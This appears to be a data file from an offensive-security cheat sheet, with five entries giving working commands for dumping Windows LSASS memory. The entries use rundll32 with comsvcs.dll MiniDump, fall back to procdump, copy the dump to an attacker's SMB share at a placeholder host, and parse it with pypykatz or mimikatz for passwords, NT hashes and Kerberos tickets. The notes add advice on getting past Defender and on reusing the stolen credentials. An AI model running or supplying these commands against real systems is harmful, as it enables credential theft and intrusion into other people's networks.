Object.assign(n[7700],{"tool":"powershell","run":"Get-Process lsass","note":"Get the LSASS PID first — comsvcs MiniDump needs it. tasklist /svc also shows it."});
Object.assign(n[7701],{"tool":"cmd","run":"rundll32 C:\\windows\\system32\\comsvcs.dll, MiniDump 672 C:\\Windows\\Temp\\lsass.dmp full","note":"Built-in LOLBin dump — replace 672 with the actual PID, run from an elevated prompt. Nothing uploaded; comsvcs.dll MiniDump is a documented Windows feature. (Defender watches this exact string on modern boxes; procdump is the fallback.)"});
Object.assign(n[7702],{"tool":"sh","run":"procdump.exe -accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp","note":"Sysinternals alternative when comsvcs is blocked. Serve procdump from your box (see file-transfer)."});
Object.assign(n[7703],{"tool":"impacket-smbserver","run":"impacket-smbserver -smb2support CompData .","note":"On YOUR box: receive the dump. From the target: move C:\\Windows\\Temp\\lsass.dmp \\\\{{lhost}}\\CompData"});
Object.assign(n[7704],{"tool":"pypykatz","run":"pypykatz lsa minidump lsass.dmp","note":"Parse offline on your box. Logonpasswords, NT hashes, and Kerberos tickets for every session captured — spray nothing, reuse everything. mimikatz sekurlsa::minidump + sekurlsa::logonpasswords is the Windows-parse variant."});
